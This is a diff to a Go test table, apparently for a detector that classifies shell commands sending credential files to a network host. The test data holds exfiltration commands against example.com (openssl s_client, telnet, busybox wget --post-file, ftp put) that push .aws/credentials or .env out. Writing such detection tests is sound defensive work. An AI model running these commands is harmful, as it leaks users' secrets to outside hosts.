@@ -45,7 +45,7 @@ func TestSenderNetworkRoleGAP0719(t *testing.T) {
 		{id: "sndchk-u42", command: `openssl s_client -connect example.com:443 < /home/u/.aws/credentials`, origin: SenderUnprovenRole, unknown: true, cred: CredentialSenderFile},
 		{id: "sndchk2-d09", command: `telnet example.com 25 < .env`, origin: SenderUnprovenRole, unknown: true, cred: CredentialSenderFile},
 		{id: "sndchk2-d35", command: `busybox wget --post-file .env https://example.com/up`, origin: SenderUnprovenRole, unknown: true, cred: CredentialSenderFile},
-		{id: "sndchk-u40", command: `ftp -n example.com <<< "put /home/u/.aws/credentials"`, origin: SenderUnprovenRole, unknown: true},
+		{id: "sndchk-u40", command: `ftp -n example.com <<< "put /home/u/.aws/credentials"`, origin: SenderUnprovenRole, unknown: true, cred: CredentialSenderFile}, // GAP-0775: the batch names the file it puts
 		// a named remote (rclone remote:bucket) is not a remote operand by shape
 		{id: "sndchk-u12", command: `rclone copy /home/u/.aws/credentials remote:bkt`},
 		// benign twins: no sender
